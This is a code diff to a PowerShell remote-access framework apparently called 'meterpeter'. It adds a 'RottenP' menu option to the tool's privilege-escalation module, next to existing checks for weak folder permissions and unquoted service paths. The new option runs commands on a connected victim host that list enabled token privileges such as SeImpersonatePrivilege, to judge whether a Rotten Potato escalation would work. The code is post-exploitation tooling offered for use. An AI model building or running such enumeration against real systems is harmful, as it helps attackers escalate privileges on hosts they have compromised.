@@ -450,6 +450,7 @@ While($Client.Connected)
         write-host "   Check     Retrieve Folder Privileges      Client:User  - Privileges Required";
         write-host "   WeakDir   Search weak privs recursive     Client:User  - Privileges Required";
         write-host "   Service   Search Unquoted Service Paths   Client:User  - Privileges Required";
+        write-host "   RottenP   Search For rotten potato vuln   Client:User  - Privileges Required";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Adv:Priv> " -NoNewline -ForeGroundColor Green;
         $my_choise = Read-Host;
@@ -475,6 +476,11 @@ While($Client.Connected)
           write-host " List Remote-Host Unquoted Service Paths." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
           $Command = "gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {`$_.StartMode -eq `"Auto`" -and `$_.PathName -notlike `"C:\Windows*`" -and `$_.PathName -notlike '`"*'} | select PathName,DisplayName,Name `> WeakFP.txt;Get-Content WeakFP.txt;remove-item WeakFP.txt -Force";
         }
+        If($my_choise -eq "RottenP" -or $my_choise -eq "rotten")
+        {
+          write-host " Search for Rotten Potato Vulnerability." -ForegroundColor Blue -BackgroundColor White;write-host "`n`n";Start-Sleep -Seconds 1;
+          $Command = "cmd /c whoami /priv|findstr /i /C:`"SeImpersonatePrivilege`" /C:`"SeAssignPrimaryPrivilege`" /C:`"SeTcbPrivilege`" /C:`"SeBackupPrivilege`" /C:`"SeRestorePrivilege`" /C:`"SeCreateTokenPrivilege`" /C:`"SeLoadDriverPrivilege`" /C:`"SeTakeOwnershipPrivilege`" /C:`"SeDebugPrivileges`" /C:`"SeTakeOwnershipPrivilege`" `> WeakDirs.txt;`$check_ACL = get-content WeakDirs.txt|findstr /i /C:`"Enabled`";If(`$check_ACL){echo `"[i] Rotten Potato Vulnerability Found ..`" `> test.txt;Get-Content test.txt;Remove-Item test.txt;Get-Content WeakDirs.txt;remove-item WeakDirs.txt -Force}else{echo `"   None Weak Permissions Found [ Rotten Potato ] ..`" `> test.txt;Get-Content test.txt;Remove-Item test.txt -Force;Remove-Item WeakDirs.txt -Force}";
+       }
         If($my_choise -eq "Return" -or $my_choise -eq "return" -or $my_choise -eq "cls" -or $my_choise -eq "Modules" -or $my_choise -eq "modules" -or $my_choise -eq "clear")
         {
           $RfPath = $Null;
